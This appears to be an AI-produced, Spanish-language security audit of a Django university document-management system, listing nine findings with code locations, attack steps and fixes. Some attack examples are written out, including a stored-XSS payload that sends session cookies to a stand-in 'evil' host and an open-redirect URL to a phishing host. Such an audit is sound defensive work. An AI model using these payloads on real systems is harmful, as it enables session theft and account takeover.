# Auditoría de Seguridad — Docuflow-prototype / SIGEA (gestion_documental)

- **Fecha:** 2026-09-05 (UTC)
- **Alcance:** `gestion_documental/` (Django 5.2.7 / Python 3.12.5 / PostgreSQL) — código, dependencias, configuraciones, permisos, secretos, superficies de ataque.
- **Modo:** solo lectura. No se modificó código; solo se creó este informe.
- **Metodología aplicada:** skill `security-audit-skill` local (ver §1). No es un checklist OWASP genérico.

> Nota de ruta: la ruta solicitada `degestion_documental\.agents\skills\security-audit-skill\` no existe tal cual.
> La ruta real es `gestion_documental\.agents\skills\security-audit-skill\skills\security-audit\` (con subcarpeta `skills/security-audit/` intermedia). Árbol confirmado:
>
> ```text
> security-audit-skill/
>   README.md
>   LICENSE
>   skills/security-audit/
>     SKILL.md
>     RECONNAISSANCE.md
>     HUNTING.md
>     ATTACK-CLASSES.md
>     MEMORY-SAFETY-AND-BINARY.md
>     AI-AND-LLM.md
>     WEB-PROTOCOL-AND-AUTH.md
>     CLIENT-SIDE.md
>     VALIDATION-AND-REPORTING.md
>     report-schema.json
>     validate-findings.cjs
> ```

---

## 1. PASO 2 — Metodología del skill (resumen fiel)

**Fuente leída completa:** `README.md` + los 11 archivos bajo `skills/security-audit/` listados arriba.

**Pipeline de 6 fases (obligatorio en orden):**

1. **Recon** — 3 agentes `research` en paralelo: (1a) overview/stack/comparable, (1b) trust boundaries + auth/authZ, (1c) inventario de superficies. Síntesis en `architecture.md`, inyectada verbatim en Fase 2.
2. **Hunt** — N agentes `general` en paralelo (pueden spawnear sub-agentes `research`). Cada prompt incluye: resumen arquitectura + clase de ataque + file paths + hunting methodology + validation rules. Nº de agentes según tamaño (3–4 lib pequeña, 8–12+ app grande, split por clase × subsistema).
3. **Validate** — consolidar duplicados, luego un agente `research` **distinto al hunter** por finding intenta *disprobarlo* (exploitation, impact, baseline, mitigation, parser/runtime). Veredicto `CONFIRMED` / `REJECTED`. "Mata falsos positivos agresivamente; 3 findings reales > 30 teóricos".
4. **Report** — `REPORT.md` (exec summary, baseline, tabla findings, detalle con path/ataque/impacto/fix, hardening notes, positive patterns) + `FINDINGS-DETAIL.md` (flujo completo MEDIUM+ con file:line, request exacto, qué obtiene atacante, cómo lo maneja el comparable).
5. **Structured output** — `findings.json` conforme a `report-schema.json` (`confirmed`/`rejected`, `trace` con paths/líneas verificadas, `intended_behavior`, `confidence`, `severity` en minúsculas), validado con `validate-findings.cjs`.
6. **Independent verification** — un agente `research` fresco por finding confirmado verifica cada claim contra el código (`VERIFIED` / `CORRECTED` / `REJECTED`) y se reconcilian los .md con el .json.

**Principios núcleo (SKILL.md):**

- Solo reportar lo **explotable con escenario concreto** (quién, qué hace, qué obtiene). "Theoretically..." no es finding.
- Confirmar dinámicamente cuando sea buildable; si requiere infra no disponible → "requires deployment testing", no confirmado.
- Baseline dinámico con comparable real (no hardcodeado): si el comparable tiene el mismo patrón y fue explotado → finding más fuerte.
- **Defense-in-depth gaps ≠ vulnerabilidades.** Si capa A previene el ataque, la ausencia de capa B es hardening note.
- **Severidad = likelihood × impacto** (no desviación de checklist).

**Escala de severidad del skill (verbatim):**

| Nivel | Definición del skill |
|---|---|
| CRITICAL | RCE no-autenticado, dump completo DB, takeover admin sin credenciales |
| HIGH | RCE autenticado, SQLi con exfiltración, stored XSS que dispara para todos, auth bypass. También: RBAC **completamente** derrotado para una acción con consecuencias reales (publicar, borrar, modificar datos ajenos) |
| MEDIUM | XSS condicional, CSRF con cambio de estado significativo, disclosure de secretos/credenciales. También: bypass lógica con consecuencias reales pero limitadas (requiere auth, confinado a datos propios, condiciones infrecuentes) |
| LOW | Disclosure no-secreto, DoS con esfuerzo sostenido |
| INFORMATIONAL | Observación confirmada de impacto mínimo, útil como building block. Gaps puros de defense-in-depth van a hardening, no aquí |

**Clases de ataque (ATTACK-CLASSES.md + companions):** Injection, Access control, Resource/file handling, Cryptography/secrets, Business logic, Feature abuse/leakage, Chained/trust-boundaries, Wildcard, Obvious-things. Companions: `MEMORY-SAFETY-AND-BINARY`, `AI-AND-LLM`, `WEB-PROTOCOL-AND-AUTH`, `CLIENT-SIDE`. Para este target Django MVT **aplican** las 8 core + `WEB-PROTOCOL-AND-AUTH` (sesiones/recovery) + `CLIENT-SIDE` (DOM/`|safe`/redirects). **No aplican** memoria/binario ni AI/LLM (sin `unsafe`, sin JIT, sin LLM/RAG/MCP) — se documenta para no inventar cobertura.

**Formato de salida del skill:** `architecture.md`, `REPORT.md`, `FINDINGS-DETAIL.md`, `findings.json` validado. El usuario pidió en su lugar un único Markdown en `informes/auditoria-seguridad-<fecha>.md` con resumen ejecutivo + tabla priorizada + detalle (Categoría, Severidad, Ubicación, Descripción+evidencia, Remediación). Este informe cumple ambos: sigue el contenido de `REPORT.md`/`FINDINGS-DETAIL.md` en un solo archivo.

**Ambigüedades / límites declarados (no invento):**

- El skill no define CVSS ni formato Markdown exacto del usuario; uso la escala del skill (CRITICAL/HIGH/MEDIUM/LOW) sin mapear a CVSS.
- No existían `findings.json` previos (`~/security-audit-skill/<repo>/`); no hay runs aditivos que reutilizar. Cobertura = 1 run; el skill advierte que un solo run encuentra ~mitad de vulns — se recomienda repetir.
- No ejecuté servidor ni exploté en vivo (modo lectura + sin infra prod); los PoC son construcciones estáticas verificadas línea por línea (Fase 3 adversarial), no ejecuciones. Donde la confirmación requiere despliegue (ej. exfiltración exacta de `/media/` en prod), lo marco.
- `validate-findings.cjs` / `findings.json` no se generan porque el entregable pedido es el .md único; la validación adversarial se aplicó manualmente (ver "Descartados").

**Recon ejecutado (Fase 1, 3 subagentes explore en paralelo):** app identificada como **SIGEA v2.0 — DMS universitario monolítico Django MVT + Service Layer** (roles `DECANA`/`COORDINADOR`/`DOCENTE_PLANTA`, flujo `PENDIENTE→APROBADO/RECHAZADO`, Zero-Trust 2-votos sensible, auditoría `usuario/acción/documento/ip`). Comparable: **Mayan EDMS** (Django+PostgreSQL). Trust model y superficies completas en el detalle de cada finding abajo; entry points clave: `config/settings.py`, `config/urls.py:10-27`, `apps/*/views.py`, `apps/*/services.py`, `core/decorators/role_required.py`, `core/services/storage_service.py`.

---

## 2. Resumen ejecutivo

Postura honesta: **núcleo authN con buenas prácticas parciales, pero autorización por objeto rota en varios endpoints y dos exposiciones graves (auditoría sin auth + XSS almacenado + uploads sin validar).** Un atacante con cualquier cuenta válida (o sin cuenta para H-01) logra impacto real: leer logs de auditoría, borrar documentos ajenos, inyectar JS en coordinadores/decana, y subir/servir contenido arbitrario vía `/media/`.

- **9 hallazgos confirmados** (validación adversarial aplicada, ver §5): **4 HIGH, 4 MEDIUM, 1 LOW** (más notas hardening y positivos).
- **No hay evidencia de SQLi, RCE remoto directo, ni bypass total de login** — ORM parametrizado, whitelist de `order_by`, lockout y mensajes genéricos funcionan.
- **Peor escenario encadenado (probado en código):** docente registrado → sube "versión" `.html/.svg` maliciosa (H-04) + título XSS (H-03) → coordinador/decana abre notificaciones → ejecución JS en sesión privilegiada → usa `POST /documentos/<id>/eliminar/` (H-02) para mandar a papelera documentos críticos + descarga `GET /auditoria/exportar/pdf/` (H-01) sin login para mapear usuarios/docs. Todo con código verificado, sin adivinanzas de parser.

**Comparativa baseline (Mayan EDMS):** Mayan exige ACL por objeto en cada vista archivo y sirve archivos vía vista con permiso (no `/media/` directo), y escapa notificaciones por defecto. SIGEA está por debajo en esos tres puntos; a la par en lockout y auditoría básica.

---

## 3. Tabla de hallazgos priorizados por severidad

| ID | Sev. | Categoría (skill) | Título | Ubicación principal |
|---|---|---|---|---|
| H-01 | **HIGH** | Access control / Feature abuse (auth bypass) | Export auditoría PDF sin autenticación expone log completo | `apps/auditoria/views.py:92` + `apps/auditoria/urls.py:11` |
| H-02 | **HIGH** | Access control (BOLA / missing object authZ) | Cualquier autenticado puede enviar a papelera cualquier documento | `apps/documentos/views.py:342` + `apps/documentos/services.py:255` |
| H-03 | **HIGH** | Injection (stored XSS) | `\|safe` en notificaciones → XSS almacenado que dispara en roles altos | `apps/notificaciones/templates/notificaciones/lista.html:68` (sink); fuentes `apps/documentos/services.py:70,80,219,247`, `apps/permisos/services.py:157-176,216-243` |
| H-04 | **HIGH** | Resource/file handling (unrestricted upload + serve) | `crear_version` y `foto_perfil` sin validación tipo/tamaño, servidos sin auth | `apps/versiones/views.py:24` + `apps/versiones/services.py:19` + `apps/usuarios/views.py:215` + `config/urls.py:27` |
| H-05 | **MEDIUM** | Access control / Feature abuse | `/media/` directo bypasea `registrar_descarga` (descarga sin permiso si se conoce URL) | `config/urls.py:27` + `config/settings.py:126-128` + `apps/documentos/services.py:291` |
| H-06 | **MEDIUM** | Access control (IDOR) + Web-protocol (open redirect) | IDOR `versiones/lista`, `marcar_leida` ajena + open-redirect `?next=` | `apps/versiones/views.py:13` + `apps/notificaciones/views.py:26-33` + `apps/notificaciones/services.py:39` |
| H-07 | **MEDIUM** | Cryptography/secrets (weak token + logic) | Recovery 6-dígitos con `random` + re-emisión resetea intentos (brute-force viable) | `apps/usuarios/services.py:109,114` + `apps/usuarios/views.py:127,161-168` |
| H-08 | **MEDIUM** | Business logic (boundary violation) | Coordinador vota sensible y lista todo fuera de su programa | `apps/permisos/services.py:263-268` + `apps/documentos/views.py:492-493` |
| H-09 | **LOW** (nota: escalar a MEDIUM si `DEBUG=True` llega a prod) | Cryptography/secrets + Obvious-things (config) | Defaults inseguros + credenciales seed débiles + flags cookie/TLS ausentes | `config/settings.py:15,18,20` + `gestion_documental/.env:4,9-11` (no trackeado, ver evidencia) + `apps/usuarios/management/commands/crear_datos_iniciales.py:75` |

Detalles, PoC y fix por finding en §4. Descartados (probados y rechazados) + hardening + positivos en §5–§7.

---

## 4. Detalle de cada hallazgo

### H-01 — Export auditoría PDF sin autenticación (HIGH)

- **Categoría:** Access control (auth bypass total sobre función admin) / Feature abuse (export como exfiltración).
- **Severidad:** HIGH — likelihood **high** (GET trivial anónimo), impacto **high** (PII + trazabilidad completa). No es CRITICAL (no es RCE/dump DB).
- **Ubicación exacta:**
  - `apps/auditoria/views.py:92-115` `def exportar_auditoria_pdf(request):` — **sin** `@login_required` ni `@role_required`, a diferencia de `lista_auditoria` (`:14-15`) y `exportar_auditoria_excel` (`:65-66`) que sí los tienen.
  - Expuesto en `apps/auditoria/urls.py:11` `path('exportar/pdf/', views.exportar_auditoria_pdf, ...)`.
- **Descripción + evidencia:**
  ```python
  # apps/auditoria/views.py:65-66 (excel: protegido)
  @login_required
  @role_required('DECANA', 'COORDINADOR')
  def exportar_auditoria_excel(request): ...

  # apps/auditoria/views.py:92-93 (pdf: desprotegido — el bug)
  def exportar_auditoria_pdf(request):
      """Exporta los registros de auditoria filtrados a PDF."""
  ```
  La vista acepta los mismos filtros `usuario,accion,documento,fecha_inicio,fecha_fin` (`:94-98`), llama `AuditoriaService.listar_registros` y devuelve `attachment auditoria_SIGEA.pdf`. El modelo `apps/auditoria/models.py:23-49` incluye usuario/email, documento/título, IP, detalle (con motivos/comentarios). Cualquier otro layer que lo mitigue: no hay middleware RBAC (`config/settings.py:44-52` solo Security/Session/Common/Csrf/Auth/Messages/Clickjacking); `role_required` retorna 403 pero aquí ni se invoca.
- **Ataque concreto (verificado estático):**
  1. Atacante anónimo: `GET /auditoria/exportar/pdf/` (opcional `?usuario=<id>&accion=DESCARGO&documento=<id>`).
  2. Resultado observable: descarga `auditoria_SIGEA.pdf` con filas usuario/documento/IP/detalle → enumeración de usuarios y documentos para encadenar H-02/H-05/H-06.
- **Remediación:** añadir los mismos decoradores que excel:
  ```python
  @login_required
  @role_required('DECANA', 'COORDINADOR')
  def exportar_auditoria_pdf(request): ...
  ```
  + test regresión: GET anónimo → 302 a login o 403; GET docente → 403; GET decana → 200. Revisar logs para ver si el endpoint fue crawleado.

### H-02 — BOLA: borrado (papelera) de documentos ajenos por cualquier autenticado (HIGH)

- **Categoría:** Access control (missing object-level authorization; parallel path más débil).
- **Severidad:** HIGH — derrota explícita de boundary ("solo autor/decana/coord pueden borrar") con consecuencia real (borrado/DoS integridad). Likelihood high (POST trivial), impacto high.
- **Ubicación exacta:**
  - Vista `apps/documentos/views.py:341-352` — solo `@login_required`, sin `role_required`, sin check autor/rol.
  - Servicio `apps/documentos/services.py:254-272` `eliminar_documento(documento_id, usuario=None, ...)` — hace `all_objects.get(pk)` + `is_deleted=True` **sin ninguna verificación** (compárese con `restaurar_documento` en vista `:379` que sí checkea, y con `editar_documento` `:224` que sí checkea).
- **Evidencia:**
  ```python
  # apps/documentos/views.py:341-346
  @login_required
  def eliminar_documento(request, documento_id):
      if request.method == 'POST':
          DocumentoService.eliminar_documento(documento_id, request.user, request)
  # apps/documentos/services.py:254-263
  def eliminar_documento(documento_id, usuario=None, request=None):
      documento = Documento.all_objects.get(pk=documento_id)
      documento.is_deleted = True
  ```
- **Ataque:** docente A autenticado: `POST /documentos/<id-victima>/eliminar/` con `csrfmiddlewaretoken` válido (obtiene el token de cualquier form propio) → documento de otro programa/autor desaparece de listados (soft-delete). Observable: `GET /documentos/papelera/` del autor muestra su doc en papelera; auditoría registra `ELIMINO` a nombre del atacante (no repudio débil, pero daño hecho). No hay check alternativo que lo frene (Fase 3 mitigation test: `registrar_descarga` y `obtener_detalle` sí checkean, pero `eliminar` no).
- **Remediación:** enforcear en servicio (no solo vista) — solo autor o DECANA, o COORDINADOR mismo programa:
  ```python
  if usuario != documento.autor and not (usuario.rol=='DECANA' or (usuario.rol=='COORDINADOR' and usuario.programa_academico==documento.programa)):
      raise PermissionError(...)
  ```
  + aplicar mismo patrón a `restaurar_documento` en servicio (hoy solo vista lo checkea). + test BOLA matriz roles × propiedad.

### H-03 — Stored XSS via `|safe` en notificaciones (HIGH)

- **Categoría:** Injection (stored XSS) / Client-side (sink en browser).
- **Severidad:** HIGH — stored, dispara para **todos los que lean notificaciones** incluidos DECANA/COORDINADOR (víctimas privilegiadas). Likelihood high (subir doc/solicitar acceso es flujo normal), impacto high (hijack sesión, acciones como víctima).
- **Ubicación exacta:**
  - Sink: `apps/notificaciones/templates/notificaciones/lista.html:68` `{{ notif.mensaje|safe }}` — desactiva el autoescape de Django.
  - Fuentes (todas concatenan input atacante sin sanitizar en `NotificacionService.crear_notificacion`):
    - `apps/documentos/services.py:70,80` `f"{autor.get_full_name()} subió '{titulo}'..."` (título controlado al subir)
    - `apps/documentos/services.py:219,247` título + comentario rechazo en aprobar/rechazar
    - `apps/permisos/services.py:157-176` motivo de `solicitar_acceso`, `:216-243` motivo_rechazo, `:301-346` título sensible
- **Evidencia sink:**
  ```html
  <p ...>{{ notif.mensaje|safe }}</p>
  ```
  Ningún otro template usa `|safe` para UGC (grep solo devuelve este + `innerHTML` JS analizados aparte). Framework mitigation (autoescape) explícitamente desactivada → validation rule client-side: "el finding es donde el código opta OUT" — aquí opta OUT.
- **Ataque:**
  1. Atacante crea doc con título `<img src=x onerror="fetch('https://evil/?c='+document.cookie)">` (o `motivo` de solicitud con payload) vía `POST /documentos/subir/` o `POST /permisos/<id>/solicitar/`.
  2. Víctima (coord/decana/autor) abre `GET /notificaciones/` → JS ejecuta en su sesión → exfiltra `sessionid`/`csrftoken`, o hace `POST /documentos/<id>/aprobar/` como víctima.
  3. Observable: alerta/fetch saliente al abrir notificaciones.
- **Remediación:** quitar `|safe` (usar `{{ notif.mensaje }}` escapado). Si se necesita formato, sanitizar en servidor con allowlist (ej. `bleach` con tags `b,i,em,strong` y sin atributos `on*`) **antes** de guardar, nunca `|safe` sobre UGC crudo. + migrar mensajes a estructura (template con variables escapadas) en vez de f-strings HTML.

### H-04 — Upload arbitrario sin validación + servido público (HIGH)

- **Categoría:** Resource/file handling (unrestricted file upload, path handling) + Feature abuse.
- **Severidad:** HIGH — bypassa control explícito (`ALLOWED_DOCUMENT_EXTENSIONS`, `MAX_UPLOAD_SIZE`) por path paralelo; permite stored XSS/RCE-contenido y phishing. Likelihood high (cualquier autenticado), impacto high.
- **Ubicación exacta:**
  - `apps/versiones/views.py:24-37` `crear_version`: `archivo = request.FILES.get('archivo')` **sin** `DocumentoForm.clean_archivo`, llama `VersionService.crear_version` (`apps/versiones/services.py:19-40`) que hace `Version.objects.create(archivo=archivo)` sin checks. Modelo `apps/versiones/models.py:21` `upload_to='docs/versiones/'`.
  - `apps/usuarios/views.py:211-217` + `apps/usuarios/services.py:330-336` `foto_perfil` (`ImageField upload_to='perfiles/'`) sin validación tamaño/tipo más allá de Pillow.
  - Contrapartes sanas (prueban que el control existe pero se bypasea): `apps/documentos/forms.py:40-55` `clean_archivo` (ext + 10MB) solo en `subir_documento`.
  - Servido: `config/urls.py:27` `static(MEDIA_URL, MEDIA_ROOT)` + `config/settings.py:126-128`.
- **Evidencia:**
  ```python
  # versiones/views.py:29-36 — cero validación
  archivo = request.FILES.get('archivo')
  descripcion = request.POST.get('descripcion_cambio', '')
  if archivo:
      version = VersionService.crear_version(documento_id=..., archivo=archivo, ...)
  ```
  `StorageService.save_document` (`core/services/storage_service.py:34`) solo hace `replace(' ','_')`, no sanitiza `../`, ni extensión, ni magic bytes, ni tamaño.
- **Ataque:**
  1. `POST /versiones/<cualquier-id>/crear/` (H-06: sin check objeto, basta adivinar ID) con `archivo=evil.html` o `evil.svg` con `<script>` + `descripcion_cambio` XSS.
  2. Obtener URL `/media/docs/versiones/evil.html` (de `versiones/lista.html:50 {{version.archivo.url}}` o adivinando `timestamp_nombre`).
  3. Enviar link a víctima o abrir directamente → JS en origen de la app (misma origin `/media/`) → robo sesión. Con `foto_perfil`, vector similar vía `{{foto_perfil.url}}` en `base.html:61`.
- **Remediación:** centralizar validación (reusar `core/utils/helpers.py:8-32` o `clean_archivo`): whitelist ext, `MAX_UPLOAD_SIZE`, verificación magic-bytes/content-type, renombrar a nombre seguro (uuid + ext validada, sin preservar nombre original), almacenar fuera de webroot o servir vía vista con `usuario_tiene_acceso` + `X-Sendfile`, `Content-Disposition: attachment`, `X-Content-Type-Options: nosniff`. + test: `.html/.svg/.exe/.js` → 400.

### H-05 — `/media/` directo permite descarga sin permiso (MEDIUM)

- **Categoría:** Access control (multiple access paths inconsistentes) / Chained.
- **Severidad:** MEDIUM — derrota parcial de boundary (requiere conocer URL; likelihood medium), impacto high (confidencialidad de sensibles). No es HIGH porque no derrota el check sin prerrequisito URL.
- **Ubicación:** `config/urls.py:27`, `config/settings.py:126-128`, vs control correcto `apps/documentos/services.py:291-303` `registrar_descarga` (check `PermisoService.usuario_tiene_acceso`).
- **Evidencia:** `static()` sirve `MEDIA_ROOT` sin pasar por `registrar_descarga` ni `AuditService`. Filenames `docs/{prog}/{cat}/{timestamp}_{filename}` (`storage_service.py:32-43`) con timestamp segundo-precisión → adivinable en ventana + filtrable vía `buscar_ajax` (`:506-510` expone `id/titulo/url`), `detalle.html:264 {{archivo.url}}`, `versiones/lista.html:50`, logs.
- **Ataque:** atacante sin permiso pero con URL (filtrada por H-06/H-08 o fuerza bruta timestamp+nombre común como `informe.pdf`): `GET /media/docs/software/.../20240101_120000_informe.pdf` → 200 sin auditoría ni 403, bypaseando `GET /documentos/<id>/descargar/` que sí daría 403.
- **Remediación:** no servir `MEDIA` directo en prod (Nginx `internal` + `X-Accel-Redirect` tras check, o vista Django con `FileResponse` + permiso + `AuditService.log`). Nombres no predecibles (uuid4), `FileResponse(as_attachment=True)`, deshabilitar directory listing. Marcado "requires deployment testing" para confirmar reachability exacta en prod (dev `static()` solo sirve con `DEBUG=True`, pero `.env:10 DEBUG=True` lo activa).

### H-06 — IDOR lectura + open-redirect `?next=` (MEDIUM)

- **Categoría:** Access control (IDOR) + Web-protocol (open redirect).
- **Severidad:** MEDIUM — likelihood high (trivial), impacto medium/low por separado, medium combinado (enumeración + phishing).
- **Ubicación exacta:**
  - `apps/versiones/views.py:13-21` `lista_versiones`: `get_object_or_404(Documento)` sin `usuario_tiene_acceso` (vs `detalle_documento` que sí). Cualquiera logueado enumera versiones de cualquier doc con ID.
  - `apps/notificaciones/services.py:38-42` `marcar_como_leida(notificacion_id)`: `filter(pk=...).update(leida=True)` sin `usuario=request.user` (vs `marcar_todas_como_leidas` que sí filtra por usuario). Vista `apps/notificaciones/views.py:26-33` lo llama sin ownership.
  - Open redirect `apps/notificaciones/views.py:30-32` `next_url = request.GET.get('next'); return redirect(next_url)` sin allowlist. Template legítimo `lista.html:72 ?next=/documentos/<id>` demuestra el param.
- **Ataques:**
  - `GET /versiones/<id-ajeno>/` → 200 con títulos/URLs archivo aunque `GET /documentos/<id>/` dé vista bloqueada.
  - `POST /notificaciones/<id-ajeno>/leida/` → marca como leída notificación de otro (pérdida integridad, ocultar alertas).
  - `GET /notificaciones/123/leida/?next=https://evil-phish/login` (con sesión válida, o link) → 302 a evil. Django `redirect()` no valida host aquí.
- **Remediación:** `lista_versiones`/`crear_version`: `if not PermisoService.usuario_tiene_acceso(...) → 403`; `marcar_como_leida`: `filter(pk=..., usuario=request.user)`; `next`: `url_has_allowed_host_and_scheme(next_url, allowed_hosts={request.get_host()})` o solo paths relativos (`next.startswith('/') and not next.startswith('//')`), fallback a lista.

### H-07 — Recovery con RNG débil + reset de intentos por re-emisión (MEDIUM)

- **Categoría:** Cryptography/secrets (weak randomness) + Business logic (rate-limit bypass).
- **Severidad:** MEDIUM — likelihood medium (requiere email válido + ventana 3min + brute-force online), impacto high (account takeover). No HIGH porque no es bypass incondicional.
- **Ubicación:** `apps/usuarios/services.py:108-117` (`random.randint(100000,999999)`, `token_expiracion +3min`, `token_intentos=0`), `:157-191` (`>=3` bloquea, pero solo por token), vistas `apps/usuarios/views.py:125-128` (confirmar re-emite), `:161-168` (reenviar re-emite sin rate-limit).
- **Evidencia:**
  ```python
  import random  # :7 — no secrets
  token = str(random.randint(100000, 999999))  # :109 (1M espacio, MT predecible)
  user.token_intentos = 0  # :114 — resetea en cada re-emisión
  ```
  Cada `POST /login/recuperar/confirmar/` o `/reenviar/` llama `solicitar_recuperacion(email)` que **sobrescribe token y resetea contador** → atacante puede ciclar: 3 intentos → reenviar → 3 nuevos contra nuevo token, indefinidamente, sin CAPTCHA ni throttle IP. `EMAIL_BACKEND console` (`config/settings.py:148`) en prod volcaría tokens a logs.
- **Ataque:** fijar `session['recovery_email']=victima@...` (paso1 no revela existencia pero fija sesión), ciclar `POST validar_token` (3 guesses) → `POST reenviar` → repetir. Con automatización, 1M espacio / 3min-ventana es ajustado, pero re-emisión + `random` (no CSPRNG) + ventana + sin alertas lo hace viable a medio plazo, sobre todo con emails conocidos (H-01 filtra emails).
- **Remediación:** `secrets.randbelow`/`secrets.token_urlsafe`, token hashed en DB (`make_password`), expiración 10–15min single-use, **no resetear intentos en re-emisión** (acumular + backoff + max 3 reenvíos/hora por email+IP), throttle IP + CAPTCHA, invalidar al cambiar password y al login exitoso, no loggear token (email real vía SMTP TLS, no console en prod).

### H-08 — Segregación por programa bypaseada (coordinador cross-programa) (MEDIUM)

- **Categoría:** Business logic (access boundary violation — right check, wrong scope).
- **Severidad:** MEDIUM — requiere rol COORDINADOR (likelihood medium), impacto medium (gobernanza/acreditación, no dump masivo). Distinción HIGH/MEDIUM del skill: no derrota rol completo, sino scope programa.
- **Ubicación:**
  - `apps/permisos/services.py:262-268`: `es_coordinador = (votante.rol == 'COORDINADOR')` sin comparar `votante.programa_academico == documento.programa` (compárese con `aprobar_documento` en `documentos/services.py:205-206` que sí lo hace, y `gestionar_accesos_view` en `permisos/views.py:30-33` que sí).
  - `apps/documentos/views.py:490-493` `buscar_documentos_ajax`: `DECANA` y `COORDINADOR` ven `Documento.objects.all()` (todo el sistema), mientras `aprobar_documentos_view` (`:137-138`) filtra por programa para coordinador.
- **Ataque:** coordinador programa A vota `APROBADO` en `POST /permisos/solicitud/<id>/responder/` para doc sensible programa B (servicio lo acepta si reúne 2 votos cross-programa) → acceso concedido fuera de su jurisdicción. + `GET /documentos/api/buscar/?q=` como coord A enumera títulos/URLs de programa B.
- **Remediación:** `votar_acceso_sensible`: exigir `votante.programa_academico == documento.programa` salvo DECANA/autor; `buscar_ajax`: mismo filtro programa que `busqueda_avanzada`/`aprobar`. Test matriz programa × rol.

### H-09 — Configuración y secretos por defecto (LOW, escalar a MEDIUM en prod)

- **Categoría:** Cryptography/secrets + Obvious-things.
- **Severidad:** LOW aislado (defense-in-depth), **MEDIUM** si `DEBUG=True` + `ALLOWED_HOSTS=*` + `SECRET_KEY` placeholder llegan a prod (skill: severity requiere impacto; aquí el impacto es condicional al despliegue → se reporta como LOW con nota de escalado, no se infla a HIGH).
- **Ubicación + evidencia:**
  - `config/settings.py:15` `SECRET_KEY = os.getenv('SECRET_KEY', 'django-insecure-cambiar-en-produccion-!@#$%^&*()')` — fallback conocido.
  - `config/settings.py:18` `DEBUG = os.getenv('DEBUG','True')...` — default True.
  - `config/settings.py:20` `ALLOWED_HOSTS = os.getenv('ALLOWED_HOSTS','localhost,127.0.0.1,*').split(',')` — incluye `*`.
  - `gestion_documental/.env:4` `DB_PASSWORD=<redactado>`, `:9` `SECRET_KEY=tu-secret-key-aqui...`, `:10` `DEBUG=True`, `:11` `ALLOWED_HOSTS=localhost,127.0.0.1,*` — credencial real-débil en disco. **Verificado:** `git ls-files` solo trackea `.env.example`, `.gitignore` (raíz y app) sí excluye `.env`/`**/.env` → **no hay leak en git** (positivo), pero el secreto es débil y compartido en disco local.
  - `apps/usuarios/management/commands/crear_datos_iniciales.py:75` `set_password('Admin123!')` para 4 seeds incl. `decana@...` superuser (`:37`) + fixture `apps/fixtures/datos_iniciales.json`. Si seeds corren en prod/staging expuesto, takeover trivial.
  - Ausentes (verificado en `settings.py`): `SECURE_SSL_REDIRECT/HSTS`, `SESSION_COOKIE_SECURE/HTTPONLY/SAMESITE`, `CSRF_COOKIE_SECURE/SAMESITE`, `EMAIL_BACKEND` es `console` (`:148`).
- **Remediación:** `SECRET_KEY` sin fallback (fallar al arrancar si falta), `DEBUG` default `False`, `ALLOWED_HOSTS` explícito sin `*`, rotar `DB_PASSWORD` y mover a gestor secretos, prohibir seeds con passwords conocidos fuera de dev (`--no-seeds-en-prod` + passwords aleatorios), `SESSION/CSRF_COOKIE_SECURE=True, HTTPONLY=True, SAMESITE='Lax'`, `SECURE_HSTS_* + SSL_REDIRECT` en prod, `EMAIL_BACKEND` SMTP TLS.

---

## 5. Validación adversarial (Fase 3 — qué intenté disprobar y qué descarté)

Aplicando `HUNTING.md` validation rules + `VALIDATION-AND-REPORTING.md` (exploitation, impact, baseline, mitigation, parser/runtime):

- **CONFIRMADOS (arriba):** cada uno tiene entrada exacta + payload + impacto observable + capa mitigante ausente verificada. `|safe`, `redirect(next)`, falta de decorador, `filter(pk)` sin usuario, `random` vs `secrets`, `upload` sin `clean` — todos leídos en el código citado.
- **RECHAZADOS (no son findings, no inflan el reporte):**
  - *"Registro público permite crear DECANA y escalar"*: **REJECTED como exploit directo.** `registro_view:82` fuerza `esta_habilitado=False` tras `crear_usuario` (que en `:265` auto-habilitaría COORD/DECANA). Requiere habilitación manual Decana. Queda como hardening (validar `rol` contra allowlist + flujo aprobación), no HIGH.
  - *"SQLi via `q`/filtros/`order_by`"*: **REJECTED.** Todo ORM (`icontains`, `filter`), `ORDENES_VALIDOS` whitelist (`documentos/services.py:190-196`), `mis_documentos` con `if/elif`. `fecha__date__gte` con string inválido → `ValidationError` 500 (robustez, no inyección).
  - *"CSRF ausente"*: **REJECTED.** `CsrfViewMiddleware` + `{% csrf_token %}` en forms POST verificados; `logout` exige POST.
  - *"JWT/alg confusion / smuggling / cache poisoning"*: **no aplicable / unverifiable from source.** No hay JWT/OAuth/SAML propios, ni proxy/CDN custom en repo. No se reporta (skill WEB-PROTOCOL gate: no reportar sin ambas mitades visibles).
- **Baseline check:** Mayan EDMS tiene el mismo stack pero **no** comparte estos patrones (sirve archivos con permiso, no usa `|safe` en notificaciones, decora exports). No atenúa severidad; la refuerza.

---

## 6. Notas de hardening (no son vulnerabilidades por sí solas)

- Activar `document_permission_required` o eliminarlo si está muerto (hoy 0 usos; autorización es inline e inconsistente).
- `FileResponse(open(ruta,'rb'))` en `documentos/views.py:439,470` sin `with`/close + `os.path.exists` TOCTOU menor; usar `FileResponse(open(...,'rb'))` como context o `FileField.open()`.
- `request.META HTTP_REFERER` para redirects (`:448,477`, `versiones/views.py:67`) — bajo riesgo, pero preferir named URLs.
- `openpyxl`/`reportlab` no están en `requirements.txt` (imports en `documentos/services.py:444,570`, `auditoria/services.py`) → builds rotos o versiones no pineadas; pin + `pip freeze` + `pip-audit`. Sanitizar `=`/`+`/`@` al inicio de celdas Excel (formula injection al abrir en Excel).
- `Google gview` (`detalle.html:409`) filtra URL interna a tercero; `ui-avatars`/`icons8`/`unpkg`/`fonts.googleapis` son dependencias externas con PII (nombres) — documentar o self-host.
- `X_FRAME_OPTIONS=SAMEORIGIN` es correcto para visor PDF; no relajar a `ALLOWALL`.
- `subir.html:277 file.name` en `innerHTML` (DOM-XSS solo con archivo local del propio atacante) + `detalle.html:264/402` `archivo.url` en `onclick`/`innerHTML` — mitigado si H-04 se corrige (nombres uuid), pero usar `textContent` + `encodeURIComponent` + CSP `script-src`/`img-src`.
- `exportar_*` con `request.GET.urlencode` preserva filtros en URL — evitar PII en query logs.
- `cambiar_estado` en `apps/usuarios/urls.py:17` apunta a vista inexistente (404/reverse) — remover código muerto.

---

## 7. Patrones positivos (qué hace bien — calibra confianza)

- Lockout login: `>=3` intentos → `bloqueado_hasta +15min` (`usuarios/services.py:47-54`), mensajes genéricos 401 vs 403 diferenciados sin enumerar (`:39-42,62-72`).
- `AUTH_PASSWORD_VALIDATORS` + política custom (8 chars, mayúscula, especial) en `cambiar_contrasena` (`:200-206`).
